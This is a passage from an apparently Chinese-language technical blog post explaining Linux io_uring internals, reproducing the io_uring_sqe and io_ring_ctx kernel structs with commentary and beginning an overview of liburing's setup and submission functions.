class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">__u8flags;<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sqe</code> , 用来表征一个IO任务的sqe, 通过在sqes 环形队列上插入此结构体, 实现内核任务的提交.  其中大部分参数都是提交给相应的任务处理函数的参数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">// 任务的类型, 用一系列枚举变量来表示</span></span><br><span class="line">__u8flags;<span class="comment">// 任务的一些标志位, 可以设置任务的一些特性</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_ring_ctx</code> 是kernel  io_uring运行的上下文，记录了io_uring 运行时需要保存的一些信息，这里就不一一分析每个成员了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> &#123;</span></span><br><span class="line"><span class="comment">/* const or read-mostly hot data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_next: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>restricted: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>off_timeout_used: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_active: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>has_evfd: <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* all CQEs should be posted only by the submitter task */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>task_complete: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>lockless_cq: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>syscall_iopoll: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>poll_activated: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_disabled: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>compat: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">submitter_task</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span>*<span class="title">rings</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span><span class="title">refs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">task_work_notify_mode</span><span class="title">notify_method</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* submission data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">uring_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring buffer of indices into array of io_uring_sqe, which is</span></span><br><span class="line"><span class="comment"> * mmapped by the application using the IORING_OFF_SQES offset.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This indirection could e.g. be used to assign fixed</span></span><br><span class="line"><span class="comment"> * io_uring_sqe entries to operations and only submit them to</span></span><br><span class="line"><span class="comment"> * the queue when needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The kernel modifies neither the indices array nor the entries</span></span><br><span class="line"><span class="comment"> * array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32*sq_array;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span>*<span class="title">sq_sqes</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cached_sq_head;</span><br><span class="line"><span class="type">unsigned</span>sq_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fixed resources fast path, should be accessed only under</span></span><br><span class="line"><span class="comment"> * uring_lock, and updated through io_uring_register(2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_node</span>*<span class="title">rsrc_node</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>cancel_seq;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_file_table</span><span class="title">file_table</span>;</span></span><br><span class="line"><span class="type">unsigned</span>nr_user_files;</span><br><span class="line"><span class="type">unsigned</span>nr_user_bufs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>**<span class="title">user_bufs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span><span class="title">submit_state</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span>*<span class="title">io_bl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">io_bl_xa</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table_locked</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">apoll_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">netmsg_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for</span></span><br><span class="line"><span class="comment"> * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL.</span></span><br><span class="line"><span class="comment"> * For SQPOLL, only the single threaded io_sq_thread() will</span></span><br><span class="line"><span class="comment"> * manipulate the list, hence no extra locking is needed there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">iopoll_list</span>;</span></span><br><span class="line"><span class="type">bool</span>poll_multi_queue;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We cache a range of free CQEs we can use, once exhausted it</span></span><br><span class="line"><span class="comment"> * should go through a slower range setup, see __io_get_cqe()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_cached</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_sentinel</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span>cached_cq_tail;</span><br><span class="line"><span class="type">unsigned</span>cq_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ev_fd</span>__<span class="title">rcu</span>*<span class="title">io_ev_fd</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_extra;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * task_work and async notification delivery cacheline. Expected to</span></span><br><span class="line"><span class="comment"> * regularly bounce b/w CPUs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">work_llist</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>check_cq;</span><br><span class="line"><span class="type">atomic_t</span>cq_wait_nr;</span><br><span class="line"><span class="type">atomic_t</span>cq_timeouts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">cq_wait</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* timeouts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span>timeout_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">timeout_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">ltimeout_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_last_tm_flush;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span><span class="title">completion_cqes</span>[16];</span></span><br><span class="line"></span><br><span class="line"><span class="type">spinlock_t</span>completion_lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IRQ completion list, under -&gt;completion_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">locked_free_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>locked_free_nr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_comp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">cq_overflow_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">sq_creds</span>;</span><span class="comment">/* cred used for __io_sq_thread() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span>*<span class="title">sq_data</span>;</span><span class="comment">/* if using sq thread polling */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">sqo_sq_wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">sqd_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_start;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_end;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">personalities</span>;</span></span><br><span class="line">u32pers_next;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Keep this last, we don&#x27;t need it for the fast path */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">poll_wq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_restriction</span><span class="title">restrictions</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* slow path rsrc auxilary data, used by update/register */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>*<span class="title">dummy_ubuf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">file_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">buf_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* protected by -&gt;uring_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">rsrc_ref_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">rsrc_node_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">rsrc_quiesce_wq</span>;</span></span><br><span class="line"><span class="type">unsigned</span>rsrc_quiesce;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_pages</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_UNIX)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span>*<span class="title">ring_sock</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* hashed buffered write serialization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_hash</span>*<span class="title">hash_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for accounting purposes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>*<span class="title">user</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>*<span class="title">mm_account</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ctx exit and cancelation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">fallback_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span><span class="title">fallback_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">exit_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">tctx_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span><span class="title">ref_comp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* io-wq management, e.g. thread count */</span></span><br><span class="line">u32iowq_limits[<span class="number">2</span>];</span><br><span class="line"><span class="type">bool</span>iowq_limits_set;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span><span class="title">poll_wq_task_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">defer_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>sq_thread_idle;</span><br><span class="line"><span class="comment">/* protected by -&gt;completion_lock */</span></span><br><span class="line"><span class="type">unsigned</span>evfd_last_cq_tail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_NO_MMAP is used, then the below holds</span></span><br><span class="line"><span class="comment"> * the gup&#x27;ed pages for the two rings, and the sqes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_ring_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_sqe_pages;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">ring_pages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">sqe_pages</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="liburing-2">liburing</h2><p>liburing 提供的核心接口有如下函数:</p><ul><li><code>io_uring_queue_init</code>  io_uring的初始化结构，用来初始化一个 <code>io_uring</code> 结构体</li><li><code>io_uring_prep_xxx</code>      用来创建一个任务</li><li><code>io_uring_submit</code>          用来提交一个任务</li></ul><h3 id="io-uring-queue-init"><code>io_uring_queue_init</code></h3><p>参数:</p><ul><li>entries: sq队列大小</li><li>rings:     <code>io_uring</code> 结构体,  liburing提供给用户态的管理结构</li><li>flags:     传递给 <code>io_uring_setup</code> 的 <code>params</code>  中的 flag, 用来控制创建的io_uring的特性, 详情可以看  <a 